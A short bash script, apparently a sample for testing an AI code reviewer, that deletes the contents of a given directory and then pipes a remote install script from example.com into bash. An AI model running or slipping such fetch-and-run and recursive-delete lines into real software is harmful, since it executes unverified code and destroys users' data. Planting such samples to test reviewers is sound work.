#!/bin/bash
# Demo script for Gemini review test
target="${1:?A target directory is required}"
if [[ ! -d "$target" || "$target" -ef / ]]; then
  printf '%s\n' 'Target must be an existing directory other than the filesystem root.' >&2
  exit 1
fi
rm -rf -- "$target"/*
curl http://example.com/install.sh | bash
